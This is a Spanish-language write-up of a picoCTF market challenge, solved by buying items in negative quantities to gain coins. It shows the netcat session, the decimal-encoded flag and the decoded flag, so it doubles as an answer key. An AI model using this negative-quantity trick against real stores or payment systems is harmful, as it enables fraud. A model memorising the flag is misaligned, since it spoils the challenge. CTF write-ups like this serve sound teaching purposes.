## Descripción
Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source. The shop is open for business at nc mercury.picoctf.net 10337.

## Solución
- Para poder realizar este reto, tenemos que tomar en cuenta la pista. Esta habla de los `edge cases` y es lo que haremos para obtener la flag.
- Para empezar, ingresamos valores irregulares cuando se nos pide una cantidad (numero negativos). Ya que estos son una causa de `edge cases`, debido a que no se toman en cuenta este tipo de casos irregulares en un sistema vulnerable.

```bash()
**└─$ nc mercury.picoctf.net 10337
Welcome to the market!
=====================
You have 40 coins
        Item            Price   Count
(0) Quiet Quiches       10      12
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
0
How many do you want to buy?
-1
You have 50 coins
**
```

- Podemos ver que al ingresar `-1` se nos dio +10 coins, por lo que haremos lo mismo pero ahora con `-5` para tener 100 coins y poder comprar la flag.

```bash()
        Item            Price   Count
(0) Quiet Quiches       10      13
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
0
How many do you want to buy?
-5
You have 100 coins
        Item            Price   Count
(0) Quiet Quiches       10      18
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 51 100 97 51 52 97 56 102 125]
```

- Podemos ver que funciono a la perfección, pero se nos devolvio una cadena de numeros decimales, por lo que utilizando [rapidtables.com](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) no sera un problema convertir a valores ASCII.

```bash()
picoCTF{b4d_brogrammer_3da34a8f}
```

## Notas adicionales
- Un `Edge Case` es "Es una situación que no es común, pero aún puede ocurrir. Por ejemplo, al programar, un caso límite puede ser un valor de entrada que está fuera de rango o una condición que es poco probable que suceda." 

## Referencias 
[Foro "Que es un edge case"](https://www.quora.com/What-is-an-edge-case-when-programming)
